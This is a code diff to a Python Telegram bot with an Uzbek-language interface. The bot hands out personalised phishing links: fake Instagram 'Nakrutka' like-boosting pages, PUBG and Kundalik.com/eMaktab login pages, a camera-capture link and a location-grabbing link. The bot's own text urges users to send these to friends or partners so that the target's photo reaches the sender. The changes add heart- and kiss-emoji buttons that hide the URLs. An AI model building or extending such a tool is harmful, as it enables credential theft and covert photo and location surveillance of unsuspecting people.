@@ -13,6 +13,7 @@ k = [
     [KeyboardButton("Rasmga olish 📸"), KeyboardButton('Lokatsiya olish 🗺')],
     [KeyboardButton("🧬 Tugmali Link Instagram 🌐"), KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"),
      KeyboardButton("🧬 Tugmali Link Kundalik.com 🌐")],
+    [KeyboardButton("🧬 Tugmali Link Rasm olish 🌐"),KeyboardButton("🧬 Tugmali Link Lokatsiya olish 🌐")]
 
 ]
 
@@ -151,11 +152,19 @@ def text(update,context):
 
     elif text=="🧬 Tugmali Link Instagram 🌐":
         k=[
-            [InlineKeyboardButton("🧬",url=f"{server}/link/Nakrutka/{update.message.from_user.id}")]
+            [InlineKeyboardButton("❤️",url=f"{server}/link/Nakrutka/1/{update.message.from_user.id}")]
         ]
-        update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
-        update.message.reply_text(f"Copy qilish uchun `{server}/link/Nakrutka/3/{update.message.from_user.id}` ni ustiga bos",
-                                  parse_mode="Markdown")
+        k2=[
+            [InlineKeyboardButton("❤️",url=f"{server}/link/Nakrutka/2/{update.message.from_user.id}")]
+        ]
+        k3=[
+            [InlineKeyboardButton("❤️",url=f"{server}/link/Nakrutka/3/{update.message.from_user.id}")]
+        ]
+
+        update.message.reply_text("💋", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
+        update.message.reply_text("💋", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k2))
+        update.message.reply_text("💋", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k2))
+
     elif text=="🧬 Tugmali Link PUBG MOBILE 🌐":
         k=[
             [InlineKeyboardButton("🧬",url=f"{server}/link/Pubg/{update.message.from_user.id}")]
@@ -170,7 +179,6 @@ def text(update,context):
         update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
         update.message.reply_text(f"Copy qilish uchun `{server}/eMaktab/login{update.message.from_user.id}` ni ustiga bos",
                                   parse_mode="Markdown")
-
 
     elif text=="PUBG MOBILE 🖤 accaunt":
         text=f"""
@@ -196,6 +204,7 @@ def text(update,context):
             [KeyboardButton("Instagram ❤️ accaunt"), KeyboardButton("PUBG MOBILE 🖤 accaunt"),KeyboardButton("Kundalik.com accaunt 😂")],
             [KeyboardButton("Rasmga olish 📸"), KeyboardButton('Lokatsiya olish 🗺')],
             [KeyboardButton("🧬 Tugmali Link Instagram 🌐"),KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"), KeyboardButton("🧬 Tugmali Link Kundalik.com 🌐")],
+            [KeyboardButton("🧬 Tugmali Link Rasm olish 🌐"), KeyboardButton("🧬 Tugmali Link Lokatsiya olish 🌐")]
         ]
         reply_markup = ReplyKeyboardMarkup(k, resize_keyboard=True)
         update.message.reply_text("*Menyulardan foydalaning /menyu 🫂*",
@@ -204,7 +213,7 @@ def text(update,context):
         text=f"""
         *Bu bo'lim yangi bo'limlarimizdan ✅*
         
-        ➡️ *{server}/camera/{update.message.from_user.id}* ⬅️
+        ➡️ *{server}/cam/{update.message.from_user.id}* ⬅️
         \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
         \nyuborsangiz. Linkga kirsa rasmi sizga keladi 
         
@@ -212,7 +221,7 @@ def text(update,context):
             Rasm kelishi uchun linkga kirgan odam cameraga ruxsat berishi shart ❗️
         """
         update.message.reply_text(text,parse_mode="Markdown")
-        update.message.reply_text(f"Copy qilish uchun `{server}/camera/{update.message.from_user.id}` ni ustiga bos",
+        update.message.reply_text(f"Copy qilish uchun `{server}/cam/{update.message.from_user.id}` ni ustiga bos",
                                   parse_mode="Markdown")
     elif text=='Lokatsiya olish 🗺':
         text = f"""
@@ -228,12 +237,27 @@ def text(update,context):
         update.message.reply_text(text, parse_mode="Markdown")
         update.message.reply_text(f"Copy qilish uchun `{server}/lat/long/{update.message.from_user.id}` ni ustiga bos",
                                   parse_mode="Markdown")
+    elif text=='🧬 Tugmali Link Rasm olish 🌐':
+        k=[
+            [InlineKeyboardButton("❤️",url=f"{server}/cam/{update.message.from_user.id}")]
+        ]
+        update.message.reply_text("💋", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
+        update.message.reply_text(f"Copy qilish uchun `{server}/cam/{update.message.from_user.id}` ni ustiga bos",
+                                  parse_mode="Markdown")
+    elif text=='🧬 Tugmali Link Lokatsiya olish 🌐':
+        k=[
+            [InlineKeyboardButton("❤️",url=f"{server}/lat/long/{update.message.from_user.id}")]
+        ]
+        update.message.reply_text("💋", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
+        update.message.reply_text(f"Copy qilish uchun `{server}/lat/long/{update.message.from_user.id}` ni ustiga bos",
+                                  parse_mode="Markdown")
 
     else:
         k = [
             [KeyboardButton("Instagram ❤️ accaunt"), KeyboardButton("PUBG MOBILE 🖤 accaunt"),KeyboardButton("Kundalik.com accaunt 😂")],
             [KeyboardButton("Rasmga olish 📸"), KeyboardButton('Lokatsiya olish 🗺')],
             [KeyboardButton("🧬 Tugmali Link Instagram 🌐"),KeyboardButton("🧬 Tugmali Link PUBG MOBILE 🌐"), KeyboardButton("🧬 Tugmali Link Kundalik.com 🌐")],
+            [KeyboardButton("🧬 Tugmali Link Rasm olish 🌐"), KeyboardButton("🧬 Tugmali Link Lokatsiya olish 🌐")]
 
         ]
         reply_markup = ReplyKeyboardMarkup(k, resize_keyboard=True)
